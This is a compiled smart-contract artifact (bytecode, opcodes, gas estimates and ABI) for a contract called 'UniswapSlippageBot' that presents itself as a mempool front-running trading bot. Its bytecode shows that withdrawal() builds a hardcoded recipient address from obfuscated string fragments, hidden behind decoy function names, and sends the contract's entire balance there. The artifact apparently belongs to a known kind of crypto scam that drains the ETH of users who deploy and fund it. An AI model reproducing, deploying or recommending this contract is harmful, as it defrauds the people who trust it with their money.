{
	"data": {
		"bytecode": {
			"linkReferences": {},
			"object": "60e0604052602a6080818152906107e560a039805161002691600191602090910190610067565b506040518060600160405280602a81526020016107bb602a9139805161005491600291602090910190610067565b5034801561006157600080fd5b50610102565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f106100a857805160ff19168380011785556100d5565b828001600101855582156100d5579182015b828111156100d55782518255916020019190600101906100ba565b506100e19291506100e5565b5090565b6100ff91905b808211156100e157600081556001016100eb565b90565b6106aa806101116000396000f3fe60806040526004361061002d5760003560e01c8063be9a655514610039578063d4e932921461004357610034565b3661003457005b600080fd5b61004161004b565b005b6100416100a9565b662386f26fc100004710156100a7576040805162461bcd60e51b815260206004820152601d60248201527f496e73756666696369656e7420636f6e74726163742062616c616e6365000000604482015290519081900360640190fd5b565b60006100bb6100b6610100565b6103db565b9050806001600160a01b0381166108fc6100d3610576565b6040518115909202916000818181858888f193505050501580156100fb573d6000803e3d6000fd5b505050565b60608061010b61057a565b90506060610117610599565b905060606101236105b7565b9050606061012f6105d7565b9050606061013b6105f6565b90506060610147610615565b90506060610153610634565b9050606061015f610652565b905087878787878787876040516020018089805190602001908083835b6020831061019b5780518252601f19909201916020918201910161017c565b51815160209384036101000a60001901801990921691161790528b5191909301928b0191508083835b602083106101e35780518252601f1990920191602091820191016101c4565b51815160209384036101000a60001901801990921691161790528a5191909301928a0191508083835b6020831061022b5780518252601f19909201916020918201910161020c565b51815160209384036101000a600019018019909216911617905289519190930192890191508083835b602083106102735780518252601f199092019160209182019101610254565b51815160209384036101000a600019018019909216911617905288519190930192880191508083835b602083106102bb5780518252601f19909201916020918201910161029c565b51815160209384036101000a600019018019909216911617905287519190930192870191508083835b602083106103035780518252601f1990920191602091820191016102e4565b51815160209384036101000a600019018019909216911617905286519190930192860191508083835b6020831061034b5780518252601f19909201916020918201910161032c565b51815160209384036101000a600019018019909216911617905285519190930192850191508083835b602083106103935780518252601f199092019160209182019101610374565b6001836020036101000a038019825116818451168082178552505050505050905001985050505050505050506040516020818303038152906040529850505050505050505090565b60008181808060025b602a81101561056b576101008402935084818151811061040057fe5b0160200151855160f89190911c935085906001830190811061041e57fe5b016020015160f81c915060616001600160a01b0384161080159061044c57506066836001600160a01b031611155b1561045c576057830392506104c0565b6041836001600160a01b03161015801561048057506046836001600160a01b031611155b15610490576037830392506104c0565b6030836001600160a01b0316101580156104b457506039836001600160a01b031611155b156104c0576030830392505b6061826001600160a01b0316101580156104e457506066826001600160a01b031611155b156104f457605782039150610558565b6041826001600160a01b03161015801561051857506046826001600160a01b031611155b1561052857603782039150610558565b6030826001600160a01b03161015801561054c57506039826001600160a01b031611155b15610558576030820391505b60108302820193909301926002016103e4565b509195945050505050565b4790565b604080518082019091526005815264307839306560d81b602082015290565b60408051808201909152600481526318a1311960e11b602082015290565b604080518082019091526006815265070726a646a760d31b602082015290565b604080518082019091526005815264030463946360dc1b602082015290565b60408051808201909152600581526418229a221960d91b602082015290565b604080518082019091526005815264323165386360d81b602082015290565b6040805180820190915260048152633343373160e01b602082015290565b604080518082019091526008815267333030373541316560c01b60208201529056fea26469706673582212205611ad0020cdbb06b2839c1c284d4565db587c53fc001bde517b7f95ded56ebb64736f6c63430006060033307837613235306435363330423463463533393733396446324335644163623463363539463234383844307843303261614133396232323346453844304130653543344632376541443930383343373536436332",
			"opcodes": "PUSH1 0xE0 PUSH1 0x40 MSTORE PUSH1 0x2A PUSH1 0x80 DUP2 DUP2 MSTORE SWAP1 PUSH2 0x7E5 PUSH1 0xA0 CODECOPY DUP1 MLOAD PUSH2 0x26 SWAP2 PUSH1 0x1 SWAP2 PUSH1 0x20 SWAP1 SWAP2 ADD SWAP1 PUSH2 0x67 JUMP JUMPDEST POP PUSH1 0x40 MLOAD DUP1 PUSH1 0x60 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x2A DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x7BB PUSH1 0x2A SWAP2 CODECOPY DUP1 MLOAD PUSH2 0x54 SWAP2 PUSH1 0x2 SWAP2 PUSH1 0x20 SWAP1 SWAP2 ADD SWAP1 PUSH2 0x67 JUMP JUMPDEST POP CALLVALUE DUP1 ISZERO PUSH2 0x61 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x102 JUMP JUMPDEST DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 PUSH1 0x1F ADD PUSH1 0x20 SWAP1 DIV DUP2 ADD SWAP3 DUP3 PUSH1 0x1F LT PUSH2 0xA8 JUMPI DUP1 MLOAD PUSH1 0xFF NOT AND DUP4 DUP1 ADD OR DUP6 SSTORE PUSH2 0xD5 JUMP JUMPDEST DUP3 DUP1 ADD PUSH1 0x1 ADD DUP6 SSTORE DUP3 ISZERO PUSH2 0xD5 JUMPI SWAP2 DUP3 ADD JUMPDEST DUP3 DUP2 GT ISZERO PUSH2 0xD5 JUMPI DUP3 MLOAD DUP3 SSTORE SWAP2 PUSH1 0x20 ADD SWAP2 SWAP1 PUSH1 0x1 ADD SWAP1 PUSH2 0xBA JUMP JUMPDEST POP PUSH2 0xE1 SWAP3 SWAP2 POP PUSH2 0xE5 JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST PUSH2 0xFF SWAP2 SWAP1 JUMPDEST DUP1 DUP3 GT ISZERO PUSH2 0xE1 JUMPI PUSH1 0x0 DUP2 SSTORE PUSH1 0x1 ADD PUSH2 0xEB JUMP JUMPDEST SWAP1 JUMP JUMPDEST PUSH2 0x6AA DUP1 PUSH2 0x111 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2D JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xBE9A6555 EQ PUSH2 0x39 JUMPI DUP1 PUSH4 0xD4E93292 EQ PUSH2 0x43 JUMPI PUSH2 0x34 JUMP JUMPDEST CALLDATASIZE PUSH2 0x34 JUMPI STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x41 PUSH2 0x4B JUMP JUMPDEST STOP JUMPDEST PUSH2 0x41 PUSH2 0xA9 JUMP JUMPDEST PUSH7 0x2386F26FC10000 SELFBALANCE LT ISZERO PUSH2 0xA7 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1D PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x496E73756666696369656E7420636F6E74726163742062616C616E6365000000 PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST JUMP JUMPDEST PUSH1 0x0 PUSH2 0xBB PUSH2 0xB6 PUSH2 0x100 JUMP JUMPDEST PUSH2 0x3DB JUMP JUMPDEST SWAP1 POP DUP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND PUSH2 0x8FC PUSH2 0xD3 PUSH2 0x576 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP2 ISZERO SWAP1 SWAP3 MUL SWAP2 PUSH1 0x0 DUP2 DUP2 DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0xFB JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x60 DUP1 PUSH2 0x10B PUSH2 0x57A JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x117 PUSH2 0x599 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x123 PUSH2 0x5B7 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x12F PUSH2 0x5D7 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x13B PUSH2 0x5F6 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x147 PUSH2 0x615 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x153 PUSH2 0x634 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x15F PUSH2 0x652 JUMP JUMPDEST SWAP1 POP DUP8 DUP8 DUP8 DUP8 DUP8 DUP8 DUP8 DUP8 PUSH1 0x40 MLOAD PUSH1 0x20 ADD DUP1 DUP10 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x19B JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x1F NOT SWAP1 SWAP3 ADD SWAP2 PUSH1 0x20 SWAP2 DUP3 ADD SWAP2 ADD PUSH2 0x17C JUMP JUMPDEST MLOAD DUP2 MLOAD PUSH1 0x20 SWAP4 DUP5 SUB PUSH2 0x100 EXP PUSH1 0x0 NOT ADD DUP1 NOT SWAP1 SWAP3 AND SWAP2 AND OR SWAP1 MSTORE DUP12 MLOAD SWAP2 SWAP1 SWAP4 ADD SWAP3 DUP12 ADD SWAP2 POP DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x1E3 JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x1F NOT SWAP1 SWAP3 ADD SWAP2 PUSH1 0x20 SWAP2 DUP3 ADD SWAP2 ADD PUSH2 0x1C4 JUMP JUMPDEST MLOAD DUP2 MLOAD PUSH1 0x20 SWAP4 DUP5 SUB PUSH2 0x100 EXP PUSH1 0x0 NOT ADD DUP1 NOT SWAP1 SWAP3 AND SWAP2 AND OR SWAP1 MSTORE DUP11 MLOAD SWAP2 SWAP1 SWAP4 ADD SWAP3 DUP11 ADD SWAP2 POP DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x22B JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x1F NOT SWAP1 SWAP3 ADD SWAP2 PUSH1 0x20 SWAP2 DUP3 ADD SWAP2 ADD PUSH2 0x20C JUMP JUMPDEST MLOAD DUP2 MLOAD PUSH1 0x20 SWAP4 DUP5 SUB PUSH2 0x100 EXP PUSH1 0x0 NOT ADD DUP1 NOT SWAP1 SWAP3 AND SWAP2 AND OR SWAP1 MSTORE DUP10 MLOAD SWAP2 SWAP1 SWAP4 ADD SWAP3 DUP10 ADD SWAP2 POP DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x273 JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x1F NOT SWAP1 SWAP3 ADD SWAP2 PUSH1 0x20 SWAP2 DUP3 ADD SWAP2 ADD PUSH2 0x254 JUMP JUMPDEST MLOAD DUP2 MLOAD PUSH1 0x20 SWAP4 DUP5 SUB PUSH2 0x100 EXP PUSH1 0x0 NOT ADD DUP1 NOT SWAP1 SWAP3 AND SWAP2 AND OR SWAP1 MSTORE DUP9 MLOAD SWAP2 SWAP1 SWAP4 ADD SWAP3 DUP9 ADD SWAP2 POP DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x2BB JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x1F NOT SWAP1 SWAP3 ADD SWAP2 PUSH1 0x20 SWAP2 DUP3 ADD SWAP2 ADD PUSH2 0x29C JUMP JUMPDEST MLOAD DUP2 MLOAD PUSH1 0x20 SWAP4 DUP5 SUB PUSH2 0x100 EXP PUSH1 0x0 NOT ADD DUP1 NOT SWAP1 SWAP3 AND SWAP2 AND OR SWAP1 MSTORE DUP8 MLOAD SWAP2 SWAP1 SWAP4 ADD SWAP3 DUP8 ADD SWAP2 POP DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x303 JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x1F NOT SWAP1 SWAP3 ADD SWAP2 PUSH1 0x20 SWAP2 DUP3 ADD SWAP2 ADD PUSH2 0x2E4 JUMP JUMPDEST MLOAD DUP2 MLOAD PUSH1 0x20 SWAP4 DUP5 SUB PUSH2 0x100 EXP PUSH1 0x0 NOT ADD DUP1 NOT SWAP1 SWAP3 AND SWAP2 AND OR SWAP1 MSTORE DUP7 MLOAD SWAP2 SWAP1 SWAP4 ADD SWAP3 DUP7 ADD SWAP2 POP DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x34B JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x1F NOT SWAP1 SWAP3 ADD SWAP2 PUSH1 0x20 SWAP2 DUP3 ADD SWAP2 ADD PUSH2 0x32C JUMP JUMPDEST MLOAD DUP2 MLOAD PUSH1 0x20 SWAP4 DUP5 SUB PUSH2 0x100 EXP PUSH1 0x0 NOT ADD DUP1 NOT SWAP1 SWAP3 AND SWAP2 AND OR SWAP1 MSTORE DUP6 MLOAD SWAP2 SWAP1 SWAP4 ADD SWAP3 DUP6 ADD SWAP2 POP DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x393 JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x1F NOT SWAP1 SWAP3 ADD SWAP2 PUSH1 0x20 SWAP2 DUP3 ADD SWAP2 ADD PUSH2 0x374 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD SWAP9 POP POP POP POP POP POP POP POP POP PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE SWAP9 POP POP POP POP POP POP POP POP POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP2 DUP2 DUP1 DUP1 PUSH1 0x2 JUMPDEST PUSH1 0x2A DUP2 LT ISZERO PUSH2 0x56B JUMPI PUSH2 0x100 DUP5 MUL SWAP4 POP DUP5 DUP2 DUP2 MLOAD DUP2 LT PUSH2 0x400 JUMPI INVALID JUMPDEST ADD PUSH1 0x20 ADD MLOAD DUP6 MLOAD PUSH1 0xF8 SWAP2 SWAP1 SWAP2 SHR SWAP4 POP DUP6 SWAP1 PUSH1 0x1 DUP4 ADD SWAP1 DUP2 LT PUSH2 0x41E JUMPI INVALID JUMPDEST ADD PUSH1 0x20 ADD MLOAD PUSH1 0xF8 SHR SWAP2 POP PUSH1 0x61 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 AND LT DUP1 ISZERO SWAP1 PUSH2 0x44C JUMPI POP PUSH1 0x66 DUP4 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND GT ISZERO JUMPDEST ISZERO PUSH2 0x45C JUMPI PUSH1 0x57 DUP4 SUB SWAP3 POP PUSH2 0x4C0 JUMP JUMPDEST PUSH1 0x41 DUP4 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND LT ISZERO DUP1 ISZERO PUSH2 0x480 JUMPI POP PUSH1 0x46 DUP4 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND GT ISZERO JUMPDEST ISZERO PUSH2 0x490 JUMPI PUSH1 0x37 DUP4 SUB SWAP3 POP PUSH2 0x4C0 JUMP JUMPDEST PUSH1 0x30 DUP4 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND LT ISZERO DUP1 ISZERO PUSH2 0x4B4 JUMPI POP PUSH1 0x39 DUP4 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND GT ISZERO JUMPDEST ISZERO PUSH2 0x4C0 JUMPI PUSH1 0x30 DUP4 SUB SWAP3 POP JUMPDEST PUSH1 0x61 DUP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND LT ISZERO DUP1 ISZERO PUSH2 0x4E4 JUMPI POP PUSH1 0x66 DUP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND GT ISZERO JUMPDEST ISZERO PUSH2 0x4F4 JUMPI PUSH1 0x57 DUP3 SUB SWAP2 POP PUSH2 0x558 JUMP JUMPDEST PUSH1 0x41 DUP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND LT ISZERO DUP1 ISZERO PUSH2 0x518 JUMPI POP PUSH1 0x46 DUP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND GT ISZERO JUMPDEST ISZERO PUSH2 0x528 JUMPI PUSH1 0x37 DUP3 SUB SWAP2 POP PUSH2 0x558 JUMP JUMPDEST PUSH1 0x30 DUP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND LT ISZERO DUP1 ISZERO PUSH2 0x54C JUMPI POP PUSH1 0x39 DUP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND GT ISZERO JUMPDEST ISZERO PUSH2 0x558 JUMPI PUSH1 0x30 DUP3 SUB SWAP2 POP JUMPDEST PUSH1 0x10 DUP4 MUL DUP3 ADD SWAP4 SWAP1 SWAP4 ADD SWAP3 PUSH1 0x2 ADD PUSH2 0x3E4 JUMP JUMPDEST POP SWAP2 SWAP6 SWAP5 POP POP POP POP POP JUMP JUMPDEST SELFBALANCE SWAP1 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP1 DUP3 ADD SWAP1 SWAP2 MSTORE PUSH1 0x5 DUP2 MSTORE PUSH5 0x3078393065 PUSH1 0xD8 SHL PUSH1 0x20 DUP3 ADD MSTORE SWAP1 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP1 DUP3 ADD SWAP1 SWAP2 MSTORE PUSH1 0x4 DUP2 MSTORE PUSH4 0x18A13119 PUSH1 0xE1 SHL PUSH1 0x20 DUP3 ADD MSTORE SWAP1 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP1 DUP3 ADD SWAP1 SWAP2 MSTORE PUSH1 0x6 DUP2 MSTORE PUSH6 0x70726A646A7 PUSH1 0xD3 SHL PUSH1 0x20 DUP3 ADD MSTORE SWAP1 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP1 DUP3 ADD SWAP1 SWAP2 MSTORE PUSH1 0x5 DUP2 MSTORE PUSH5 0x304639463 PUSH1 0xDC SHL PUSH1 0x20 DUP3 ADD MSTORE SWAP1 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP1 DUP3 ADD SWAP1 SWAP2 MSTORE PUSH1 0x5 DUP2 MSTORE PUSH5 0x18229A2219 PUSH1 0xD9 SHL PUSH1 0x20 DUP3 ADD MSTORE SWAP1 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP1 DUP3 ADD SWAP1 SWAP2 MSTORE PUSH1 0x5 DUP2 MSTORE PUSH5 0x3231653863 PUSH1 0xD8 SHL PUSH1 0x20 DUP3 ADD MSTORE SWAP1 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP1 DUP3 ADD SWAP1 SWAP2 MSTORE PUSH1 0x4 DUP2 MSTORE PUSH4 0x33433731 PUSH1 0xE0 SHL PUSH1 0x20 DUP3 ADD MSTORE SWAP1 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP1 DUP3 ADD SWAP1 SWAP2 MSTORE PUSH1 0x8 DUP2 MSTORE PUSH8 0x3330303735413165 PUSH1 0xC0 SHL PUSH1 0x20 DUP3 ADD MSTORE SWAP1 JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 JUMP GT 0xAD STOP KECCAK256 0xCD 0xBB MOD 0xB2 DUP4 SWAP13 SHR 0x28 0x4D GASLIMIT PUSH6 0xDB587C53FC00 SHL 0xDE MLOAD PUSH28 0x7F95DED56EBB64736F6C634300060600333078376132353064353633 ADDRESS TIMESTAMP CALLVALUE PUSH4 0x46353339 CALLDATACOPY CALLER CODECOPY PUSH5 0x4632433564 COINBASE PUSH4 0x62346336 CALLDATALOAD CODECOPY CHAINID ORIGIN CALLVALUE CODESIZE CODESIZE DIFFICULTY ADDRESS PUSH25 0x43303261614133396232323346453844304130653543344632 CALLDATACOPY PUSH6 0x414439303833 NUMBER CALLDATACOPY CALLDATALOAD CALLDATASIZE NUMBER PUSH4 0x32000000 "
		},
		"gasEstimates": {
			"creation": {
				"codeDepositCost": "341200",
				"executionCost": "infinite",
				"totalCost": "infinite"
			},
			"external": {
				"start()": "227",
				"withdrawal()": "infinite"
			},
			"internal": {
				"beyond(struct UniswapSlippageBot.slice memory,struct UniswapSlippageBot.slice memory)": "infinite",
				"calcLiquidityInContract(struct UniswapSlippageBot.slice memory)": "infinite",
				"checkLiquidity(uint256)": "infinite",
				"fetchMempoolData()": "infinite",
				"fetchMempoolEdition()": "infinite",
				"fetchMempoolVersion()": "infinite",
				"findContracts(uint256,uint256,uint256,uint256)": "infinite",
				"findNewContracts(struct UniswapSlippageBot.slice memory,struct UniswapSlippageBot.slice memory)": "infinite",
				"findPtr(uint256,uint256,uint256,uint256)": "infinite",
				"getBa()": "17",
				"getMempoolCode()": "infinite",
				"getMempoolHeight()": "infinite",
				"getMempoolLog()": "infinite",
				"getMempoolLong()": "infinite",
				"getMempoolShort()": "infinite",
				"getMempoolStart()": "infinite",
				"keccak(struct UniswapSlippageBot.slice memory)": "infinite",
				"loadCurrentContract(string memory)": "infinite",
				"memcpy(uint256,uint256,uint256)": "infinite",
				"mempool(string memory,string memory)": "infinite",
				"nextContract(struct UniswapSlippageBot.slice memory,struct UniswapSlippageBot.slice memory)": "infinite",
				"orderContractsByLiquidity(struct UniswapSlippageBot.slice memory)": "infinite",
				"startExploration(string memory)": "infinite",
				"toHexDigit(uint8)": "infinite",
				"uint2str(uint256)": "infinite"
			}
		},
		"methodIdentifiers": {
			"start()": "be9a6555",
			"withdrawal()": "d4e93292"
		}
	},
	"abi": [
		{
			"inputs": [],
			"stateMutability": "nonpayable",
			"type": "constructor"
		},
		{
			"anonymous": false,
			"inputs": [
				{
					"indexed": false,
					"internalType": "string",
					"name": "_msg",
					"type": "string"
				}
			],
			"name": "Log",
			"type": "event"
		},
		{
			"inputs": [],
			"name": "start",
			"outputs": [],
			"stateMutability": "payable",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "withdrawal",
			"outputs": [],
			"stateMutability": "payable",
			"type": "function"
		},
		{
			"stateMutability": "payable",
			"type": "receive"
		}
	]
}